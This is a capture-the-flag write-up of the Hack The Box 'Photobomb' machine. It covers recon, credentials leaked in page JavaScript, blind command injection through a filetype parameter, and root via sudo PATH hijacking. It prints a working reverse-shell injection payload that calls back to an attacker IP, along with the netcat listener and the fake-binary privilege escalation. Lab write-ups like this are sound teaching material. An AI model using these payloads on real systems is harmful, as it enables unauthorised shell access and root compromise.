---
title: Hack The Box - Photobomb
date: 2023-02-12
categories: [hackthebox]
tags: [linux,easy,path hijack,command injection,photobomb]
comments: true
toc: true
---
<img src="/assets/Hackthebox/Photobomb/0.png"  width="90%" height="70%">

Photobomb was a easy rated linux box, where plaintext credentials was discovered after
viewing the source code. These credentials then lead to a webpage with download 
functionality that was vulnerable to blind command injection. User was able to run the script with sudo permission and path hijacking was used to escalate privileges to root.

## RECON

### NMAP

Initial `nmap` scan discoverd ony two ports `22(ssh)` and `80(http)` open.
```bash
$nmap -p- --min-rate 10000 10.10.11.182 -oN photobomb.nmap 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-12 10:39 +0545 
Nmap scan report for 10.10.11.182 
Host is up (0.081s latency). 
Not shown: 65533 closed tcp ports (conn-refused) 
PORT   STATE SERVICE 
22/tcp open  ssh 
80/tcp open  http 
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds 

$nmap -p 22,80 -sC -sV --min-rate 10000 10.10.11.182 -oN photobomb-service.nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-12 10:40 +0545 
Nmap scan report for 10.10.11.182 
Host is up (0.080s latency). 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA) 
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA) 
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519) 
80/tcp open  http    nginx 1.18.0 (Ubuntu) 
|_http-title: Did not follow redirect to http://photobomb.htb/ 
|_http-server-header: nginx/1.18.0 (Ubuntu) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 10.25 seconds
```

## WEB PORT 80

on browsing the ip address `http://10.10.11.182` it redirects us to `photobomb.htb`. so adding it to `/etc/hosts`

```bash
$sudo echo "10.10.11.182 photobomb.htb" >> /etc/hosts

$cat /etc/hosts
10.10.11.182    photobomb.htb
```

![](/assets/Hackthebox/Photobomb/1.png)

on browsing, `http://photobomb.htb` it disaplayed a page containing a link. This link then redirect us to a login portal at `/printer`.

![](/assets/Hackthebox/Photobomb/2.png)

we tried some default credentails `admin:admin` `admin:password` but it doesnot seem to work.

When trying to visit `photobomb.htb/index.html` or any other page that doesnot exists, it shows that sinatra does'nt know this ditty. 

![](/assets/Hackthebox/Photobomb/3.png)

### SOURCE CODE
viewing the source code of the photobomb.htb, there's a `photobomb.js` and we found some credentials on it.
```javascript
function init() { 
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me 
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) { 
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer'); 
  } 
} 
window.onload = init;
```

with these creds we can now login to `/printer`. After we are logged in, it dispalys a webpage that includes a several images, as well as the ability to specify their dimensions and download them.

![](/assets/Hackthebox/Photobomb/4.png)

![](/assets/Hackthebox/Photobomb/5.png)

## COMMAND INJECTION

while testing for `command injection`, when we add `sleep 5` on `photo` or `dimension` parameter we get 500 server error response.

![](/assets/Hackthebox/Photobomb/6.png)

But when we add `sleep 5` on `filetype` parameter we get response after `5400 milisecs`, this confirms that there's a `command injection` vulnerability.

![](/assets/Hackthebox/Photobomb/7.png)


## SHELL AS WIZARD

On replacing `sleep 5` with our reverse shell we got shell as `wizard` user.
```bash
photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=png%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.14/4444+0>%261'&dimensions=150x100
```

```bash
$sudo nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.182] 55200
bash: cannot set terminal process group (734): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ 
```

## SHELL AS ROOT
On running `sudo -l`, the output shows that the user `wizard` can run `/opt/cleanup.sh` with `sudo` permissions and without password.
```bash
wizard@photobomb:~$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

### PATH HIJACKING
### /opt/cleanup.sh

We cannot edit the contents of `/opt/cleanup.sh` but we can read it.
```bash
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

On analysing, the cleaup.sh script we can see that there's a `path hijacking`. Here, all the binaries are referenced with the full path except `find`.
That means, bash will look for binaries in `$PATH` and find will run from `/usr/bin/find`.

```bash
wizard@photobomb:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

wizard@photobomb:/tmp$ which find
/usr/bin/find
```

creating `find` file in `/tmp` and making it executable.
```bash
wizard@photobomb:/tmp$ pwd
/tmp
wizard@photobomb:/tmp$ cat find
#!/bin/bash

bash

wizard@photobomb:/tmp$ chmod +x find
```
now we can run cleanup.sh with sudo permission but set the PATH variable to /tmp and get a root shell.
```
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb#
```
